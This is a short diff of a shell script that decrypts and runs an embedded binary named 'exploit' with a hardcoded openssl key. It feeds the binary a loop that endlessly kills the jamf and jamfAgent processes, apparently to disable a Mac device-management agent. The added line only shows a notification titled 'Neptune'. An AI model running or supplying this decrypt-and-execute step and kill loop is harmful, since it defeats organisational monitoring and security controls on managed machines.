@@ -24,6 +24,7 @@ openssl des3 -d -in "$res/exp.out.des3" -k b51861c95142fce29aef7b6416fa21d5 > "$
 chmod +x "$exploit"
 
 echo "Doing work."
+osascript -e 'display notification "Keeping access open. Force quit when done." with title "Neptune" sound name ""'
 "$exploit" <<'EOF'
 (for ((;;)); do killall jamf jamfAgent; done) &
 EOF
